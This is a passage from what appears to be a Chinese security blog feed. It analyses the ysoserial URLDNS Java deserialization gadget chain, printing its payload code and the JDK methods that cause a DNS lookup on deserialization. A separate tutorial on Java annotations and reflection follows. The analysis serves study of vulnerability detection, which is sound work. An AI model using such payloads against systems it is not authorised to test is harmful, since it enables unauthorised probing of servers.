class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>看到 URLDNS 类的 getObject ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 HashMap 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>    <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>    <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>    <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>    ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>    Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>    <span class="hljs-keyword">return</span> ht;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们前⾯说了，触发反序列化的⽅法是 readObject ，因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，所以导致可以构造利⽤链。</p><p>那么，我们可以直奔 HashMap 类的 readObject ⽅法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-type">int</span>)fc));<br>        <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//在这里用HashMap的键名计算了Hash</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只是简简单单的调用了Key的hashCode(),我们EXP传入的Key是一个URL对象，所以来看<code>java.net.URL#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> hashCode;<br><br>    hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>开头会判断hashCode是否为-1，假如不是，则直接返回，这里就是我们之前Exp提到过的。<br>此处的handler是URLStreamHandler对象，然后跟进hashCode()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>     <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>     <span class="hljs-comment">// Generate the protocol part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>     <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>         h += protocol.hashCode();<br><br>     <span class="hljs-comment">// Generate the host part.</span><br>     <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>     <span class="hljs-keyword">if</span> (addr != <span class="hljs-literal">null</span>) &#123;<br>         h += addr.hashCode();<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>         <span class="hljs-keyword">if</span> (host != <span class="hljs-literal">null</span>)<br>             h += host.toLowerCase().hashCode();<br>     &#125;<br><br>     <span class="hljs-comment">// Generate the file part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> u.getFile();<br>     <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>)<br>         h += file.hashCode();<br><br>     <span class="hljs-comment">// Generate the port part.</span><br>     <span class="hljs-keyword">if</span> (u.getPort() == -<span class="hljs-number">1</span>)<br>         h += getDefaultPort();<br>     <span class="hljs-keyword">else</span><br>         h += u.getPort();<br><br>     <span class="hljs-comment">// Generate the ref part.</span><br>     <span class="hljs-type">String</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> u.getRef();<br>     <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>)<br>         h += ref.hashCode();<br><br>     <span class="hljs-keyword">return</span> h;<br> &#125;<br></code></pre></td></tr></table></figure><p>这里是对传入的URL进行解析，将每部分的Hash值叠加最后返回。这里调用了一个<code>getHostAddress()</code>，跟进</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">InetAddress addr <span class="hljs-operator">=</span> getHostAddress(u)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> u.hostAddress;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost();<br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            u.hostAddress = InetAddress.getByName(host);<br>        &#125; <span class="hljs-keyword">catch</span> (UnknownHostException ex) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (SecurityException se) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> u.hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键的地方<code>InetAddress.getByName(host);</code>，查看文档</p><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>确定主机名称的IP地址。<br>主机名称可以是机器名称，例如“ java.sun.com ”或其IP地址的文本表示。 如果提供了文字IP地址，则只会检查地址格式的有效性。</p></blockquote><p>也就是进行DNS解析,来看最后的利用链，比较简单：</p><blockquote><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p></blockquote><p>我们可以通过这条链很容易判断是否存在反序列化漏洞</p><p>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。</p><p>另外，ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀个 SilentURLStreamHandler 类，这不是必须的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java之反射与注解</title>
    <link href="/Decemberus.github-io/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/"/>
    <url>/Decemberus.github-io/2022/11/01/Java%E4%B9%8B%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Java之反射与注解"><a href="#Java之反射与注解" class="headerlink" title="Java之反射与注解"></a>Java之反射与注解</h1><h1 id="注解Annotation"><a href="#注解Annotation" class="headerlink" title="注解Annotation"></a>注解Annotation</h1><h2 id="1、什么是注解"><a href="#1、什么是注解" class="headerlink" title="1、什么是注解"></a>1、什么是注解</h2><p>Annotation 是从JDK5.0开始引入的新技术 .</p><h3 id="Annotation的作用"><a href="#Annotation的作用" class="headerlink" title="Annotation的作用"></a>Annotation的作用</h3><p>不是程序本身 , 可以对程序作出解释.(这一点和注释(comment)没什么区别)</p><p>可以被其他程序(比如:编译器等)读取.</p><h3 id="Annotation的格式"><a href="#Annotation的格式" class="headerlink" title="Annotation的格式"></a>Annotation的格式</h3><p>注解是以”@注释名”在代码中存在的</p><p>还可以添加一些参数值 , 例如:@SuppressWarnings(value&#x3D;”unchecked”)</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300638.png" alt="image-20220929195515728"> </p><h3 id="Annotation在哪里使用"><a href="#Annotation在哪里使用" class="headerlink" title="Annotation在哪里使用?"></a>Annotation在哪里使用?</h3><p>可以附加在package , class , method , fifield 等上面 , 相当于给他们添加了额外的辅助信息</p><p>我们可以通过反射机制实现对这些元数据的访问</p><h2 id="2、内置注解"><a href="#2、内置注解" class="headerlink" title="2、内置注解"></a>2、内置注解</h2><p>下面提供一些常用的内置注解</p><h3 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h3><p>定义在 java.lang.Override 中 , 此注释只适用于修辞方法 , 表示一个方法声明打算重写超类中的另一个方法声明.</p><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h3><p>定义在java.lang.Deprecated中 , 此注释可以用于修辞方法 , 属性 , 类 ,</p><p>表示不鼓励程序员使用这样的元素 , 通常是因为它很危险或者存在更好的选择 .</p><h3 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h3><p>定义在java.lang.SuppressWarnings中,用来抑制编译时的警告信息.</p><p>与前两个注释有所不同,你需要添加一个参数才能正确使用,这些参数都是已经定义好了的,我们</p><p>选择性的使用就好了 .</p><p>@SuppressWarnings(“all”)</p><p>@SuppressWarnings(“unchecked”)</p><p>@SuppressWarnings(value&#x3D;{“unchecked”,”deprecation”})</p><p>等等 </p><h2 id="3、元注解"><a href="#3、元注解" class="headerlink" title="3、元注解"></a>3、元注解</h2><p>元注解的作用就是负责注解其他注解 , Java定义了4个标准的meta-annotation类型,他们被用来提供对其他annotation类型作说明 .</p><p>这些类型和它们所支持的类在java.lang.annotation包中可以找到 .( @Target , @Retention ,@Documented , @Inherited )</p><p>@Target : 用于描述注解的使用范围(即:被描述的注解可以用在什么地方)</p><p>@Retention : 表示需要在什么级别保存该注释信息 , 用于描述注解的生命周期</p><p>(SOURCE &lt; CLASS &lt; RUNTIME)</p><p>@Document：说明该注解将被包含在javadoc中</p><p>@Inherited：说明子类可以继承父类中的该注解</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300481.png" alt="image-20220929205025676"> </p><h2 id="4、自定义注解"><a href="#4、自定义注解" class="headerlink" title="4、自定义注解"></a>4、自定义注解</h2><p>使用 @interface自定义注解时 , 自动继承了java.lang.annotation.Annotation接口</p><p><strong>分析 :</strong></p><p>1、@ interface用来声明一个注解 , 格式 : public @ interface 注解名 { 定义内容 }</p><p>2、其中的每一个方法实际上是声明了一个配置参数.</p><p>3、方法的名称就是参数的名称.</p><p>4、返回值类型就是参数的类型 ( 返回值只能是基本类型,Class , String , enum ).</p><p>5、可以通过default来声明参数的默认值</p><p>6、如果只有一个参数成员 , 一般参数名为value</p><p>7、注解元素必须要有值 , 我们定义注解元素时 , 经常使用空字符串,0作为默认值 </p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300905.png" alt="image-20220929212624141"> 可以看到上述示例代码</p><h1 id="反射机制Reflection"><a href="#反射机制Reflection" class="headerlink" title="反射机制Reflection"></a>反射机制Reflection</h1><h2 id="1、静态与动态语言"><a href="#1、静态与动态语言" class="headerlink" title="1、静态与动态语言"></a>1、静态与动态语言</h2><ul><li><p>动态语言</p><ul><li>是一类在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</li><li>主要动态语言：Object-C、C#、JavaScript、PHP、Python等。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//体现动态语言的代码 </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> x = <span class="hljs-string">&quot;var a=3;var b=5;alert(a+b)&quot;</span>;<br>    <span class="hljs-built_in">eval</span>(x); &#125;<br></code></pre></td></tr></table></figure></li><li><p>静态语言</p><ul><li>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</li><li>Java不是动态语言，但Java可以称之为“准动态语言”。即Java有一定的动态性，我们可以利用反射机制获得类似动态语言的特性。Java的动态性让编程的时候更加灵活！</li></ul></li></ul><h2 id="2、Java-Reflection"><a href="#2、Java-Reflection" class="headerlink" title="2、Java Reflection"></a>2、Java Reflection</h2><p>Reflection（反射）是Java被视为动态语言的关键，反射机制允许程序在执行期借助于Reflflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>)<br></code></pre></td></tr></table></figure><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为：<strong>反射</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300729.png" alt="image-20220929220025130"> </p><h3 id="Java反射提供的功能"><a href="#Java反射提供的功能" class="headerlink" title="Java反射提供的功能"></a>Java反射提供的功能</h3><ul><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li>生成动态代理</li></ul><h3 id="Java反射优点和缺点"><a href="#Java反射优点和缺点" class="headerlink" title="Java反射优点和缺点"></a>Java反射优点和缺点</h3><p>优点：可以实现动态创建对象和编译，体现出很大的灵活性 !</p><p>缺点：对性能有影响。使用反射基本上是一种解释操作，我们可以告诉JVM，我们希望做什么并且它满足我们的要求。这类操作总是慢于 直接执行相同的操作</p><h2 id="3、反射主要的api"><a href="#3、反射主要的api" class="headerlink" title="3、反射主要的api"></a>3、反射主要的api</h2><p>java.lang.Class : 代表一个类</p><p>java.lang.reflflect.Method : 代表类的方法</p><p>java.lang.reflflect.Field : 代表类的成员变量</p><p>java.lang.reflflect.Constructor : 代表类的构造器</p><h2 id="4、Class类"><a href="#4、Class类" class="headerlink" title="4、Class类"></a>4、Class类</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300460.png" alt="image-20220930190137096"> </p><p>这是一些基本方法，创建一个构造器，一个有参构造器，一个重写str方法</p><p>在Object类中定义了以下的方法，此方法将被所有子类继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Class <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>以上的方法返回值的类型是一个Class类，此类是Java反射的源头，实际上所谓反射从程序的运行结果来看也很好理解，即：可以通过对象反射求出类的名称</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300243.png" alt="image-20220930193349643"> </p><p>对象照镜子后可以得到的信息：某个类的属性、方法和构造器、某个类到底实现了哪些接口。对于每个类而言，JRE 都为其保留一个不变的 Class 类型的对象。一个 Class 对象包含了特定某个结构(class&#x2F;interface&#x2F;enum&#x2F;annotation&#x2F;primitive type&#x2F;void&#x2F;[])的有关信息</p><ul><li>Class 本身也是一个类</li><li>Class 对象只能由系统建立对象</li><li>一个加载的类在 JVM 中只会有一个Class实例</li><li>一个Class对象对应的是一个加载到JVM中的一个.class文件</li><li>每个类的实例都会记得自己是由哪个 Class 实例所生成</li><li>通过Class可以完整地得到一个类中的所有被加载的结构</li><li>Class类是Reflflection的根源，针对任何你想动态加载、运行的类，唯有先获得相应的Class对象</li></ul><p>下面代码介绍了获取class的多种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        person  person1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">student</span>();<br>        System.out.println(<span class="hljs-string">&quot;this is &quot;</span>+person1.name);<br>        <span class="hljs-comment">//通过对象获得</span><br>        Class c1=person1.getClass();<br>        <span class="hljs-comment">//通过forname获得</span><br>        Class c2=Class.forName(<span class="hljs-string">&quot;student&quot;</span>);<br>        <span class="hljs-comment">//通过类名.class获得</span><br>        Class c3=student.class;<br>        <span class="hljs-comment">//通过type获得</span><br>        Class c4=Integer.TYPE;<br>        <span class="hljs-comment">//获取父类类型</span><br>        Class c5=c2.getClass();<br>        System.out.println(c3.hashCode());<br>        System.out.println(c2.hashCode());<br>        System.out.println(c1.hashCode());<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">person</span>&#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">student</span><span 